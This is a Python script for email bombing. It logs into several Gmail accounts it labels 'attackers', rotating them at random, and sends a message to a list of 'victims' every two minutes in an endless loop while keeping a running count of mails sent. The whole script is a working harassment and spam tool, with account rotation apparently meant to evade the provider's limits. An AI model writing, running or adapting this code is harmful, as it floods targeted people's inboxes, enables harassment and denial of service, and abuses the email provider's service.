# Imports
import smtplib 
from email.mime.text import MIMEText
import random
import time
# Email arrays
# Enter only email without @gmail.com
email_attackers = ['xxx',
                   'yyy',
                   'zzz']
email_victims   = ['victim@email.com',
                   'victim2@email.com']
# Email sender set up (gmail config)
s = smtplib.SMTP('smtp.gmail.com', 587)
s.set_debuglevel(1)
s.starttls()
# email body parser
msg = MIMEText("""text""")
mail_counter = 110
# Email loopers
arr = []
while True:  
  if len(email_attackers) == 0:
    for x in range(2,-1, -1):
      print(x)
      email_attackers.insert(x, arr.pop(x))
  if len(email_attackers) > 0:
    rand_mail = random.randint(0,len(email_attackers)-1)
    sender = email_attackers[rand_mail] + "@gmail.com"
    s.login(email_attackers[rand_mail], "<password>") # In this case all the passwd are the same
    print(email_attackers[rand_mail])
    arr.append(email_attackers[rand_mail])
    email_attackers.pop(rand_mail)
    print(arr)
    print(email_attackers)

  # variables set up
  
  recipients = email_victims
  msg['Subject'] = "<subject>"
  msg['From'] = sender
  msg['To'] = ", ".join(recipients)
  # Email login and sending
   
  s.sendmail(sender, recipients, msg.as_string())
  mail_counter = mail_counter + 1
  print('About ' + str(mail_counter) + ' mail sent. Tot: ' + str(mail_counter*len(email_victims)))
  # "PC EXPLOSION PREVENTER"
  time.sleep(120) #time in seconds
